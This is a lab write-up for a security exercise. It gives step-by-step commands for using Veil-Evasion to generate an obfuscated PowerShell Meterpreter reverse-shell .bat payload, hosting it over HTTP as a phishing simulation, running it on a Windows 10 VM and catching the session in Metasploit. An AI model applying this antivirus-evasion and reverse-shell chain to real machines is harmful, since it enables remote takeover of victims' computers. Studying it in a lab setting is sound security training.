# Veil-Evasion Payload Execution Lab

This repository contains documentation and results from generating and executing an obfuscated payload using **Veil-Evasion**, serving it to a Windows host, and capturing a **Meterpreter** session through Metasploit.

---

## 🔥 Summary

In this lab, a **PowerShell Meterpreter Reverse TCP payload** was generated using Veil-Evasion (Payload ID: 22).  
The resulting `.bat` payload was hosted via a Python HTTP server and executed manually on a Windows 10 VM.  
Metasploit’s `multi/handler` successfully received the connection, confirming AV evasion and payload execution.

## 🛠️ Steps Performed

### 1. Start Veil  
```bash
veil
```

### 2. Load Evasion Payloads  
```bash
use 1
list
```

### 3. Select Payload ID 22  
```bash
use 22
```

### 4. Configure Payload Options  
```bash
set LHOST <IP Address>
set LPORT <PORT>
generate
```

Enter payload name when prompted, e.g. **black**.

Output files created in:  
```
/var/lib/veil/output/source/
```

---

## 🌐 Hosting the Payload (Phishing Simulation)

Navigate to output directory:

```bash
cd /var/lib/veil/output/source/
start server
```

Payload accessible at:

```
http://<LHOST>:PORT/black.bat
```

---

## 🖥️ Execute Payload on Windows

Download and run the `.bat` payload manually on the Windows host (lab use only).  
Windows SmartScreen may warn about unsigned code; execution proceeds.

---

## 🎧 Start Metasploit Listener

```bash
msfconsole -r /path/for/.rc
```

Listener starts automatically with correct payload configuration.

## 📡 Successful Meterpreter Session

Once executed on Windows:

```
Meterpreter session 1 opened
```

Interact with the session:

```bash
sessions -i 1
```
